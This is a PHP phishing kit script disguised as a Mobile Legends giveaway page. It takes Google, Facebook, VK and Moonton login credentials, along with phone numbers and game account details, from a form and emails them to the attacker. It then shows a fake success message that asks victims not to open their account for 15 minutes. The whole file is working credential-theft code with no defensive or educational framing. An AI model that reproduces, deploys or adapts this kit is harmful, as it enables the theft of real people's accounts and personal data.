<?php 

$gmail = $_POST['gmail'];
$pwgmail = $_POST['pwgmail'];
$fb = $_POST['fb'];
$pwfb = $_POST['pwfb'];
$vk = $_POST['vk'];
$pwvk = $_POST['pwvk'];
$momail = $_POST['momail'];
$mopw = $_POST['mopw'];
$nick = $_POST['nick'];
$lvl = $_POST['lvl'];
$skin = $_POST['skin'];
$recover = $_POST['recover'];
$no = $_POST['no'];
$country = $_POST['country'];

$body = "

-===¦ Google Account ¦===-

|>> Email : ".$gmail."
|>> Password : ".$pwgmail."

-===¦ Facebook Account ¦===-

|>> Email : ".$fb."
|>> Password : ".$pwfb."

-===¦ VK Account ¦===-

|>> Email : ".$vk."
|>> Password : ".$pwvk."

-===¦ Moonton Account ¦===-

|>> Email : ".$momail."
|>> Password : ".$mopw."

-===¦ DETAIL GAME ¦===-

|>> Nickname : ".$nick."
|>> Email Recovery : ".$recover." 
|>> Phone Number : ".$no."
|>> Level : ".$lvl."
|>> Jumlah Skin : ".$skin."
|>> Negara : ".$country." 

-===¦ MANCING LAGE ¦===-

";

include 'email.php';
$subject ="Mobile Legend Level [".$lvl."] [".$skin." Skin] Punya [".$nick."]";
$headers ="From: All Log Bosku <renarc@result.com>";
mail($emailku, $subject, $body, $headers);


$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>
<!DOCTYPE HTML>
<html lang="en">
	<head>
		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Mobile Legends</title>
        <link rel="shorcut icon" href="./img/favicon.ico" />
        <link rel="stylesheet" media="only screen and (min-width: 720px)" href="./ccss/style.css" />
        <link rel="stylesheet" media="only screen and (max-width: 720px)" href="./ccss/style.css" />
	</head>
	<body>
		<div class="form">
			<font color="#fff" style="letter-spacing: 1px;">>> successfully <<</font><br/>
			<b><u><font color="#fff" style="letter-spacing: 1px;"><?php echo $_POST['nick']; ?></font></u></b><br/>
			<font color="#fff" style="letter-spacing: 1px;">You have successfully obtained this item, please do not open your account for 15 minutes after picking up the item!</font><p/>
			<button type="submit" class="button button-block" onclick="location.href='/';">Logout</button
		</div>
	</body>
</html>